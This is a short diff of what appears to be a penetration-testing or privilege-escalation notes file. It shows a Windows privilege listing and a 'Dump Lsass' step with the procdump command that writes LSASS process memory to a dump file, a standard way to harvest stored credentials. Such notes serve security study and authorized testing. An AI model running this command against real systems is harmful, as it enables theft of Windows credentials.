@@ -13,7 +13,7 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 ```
 
-Dump Lsass
+Dump Lsass:
 
 ```bash
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
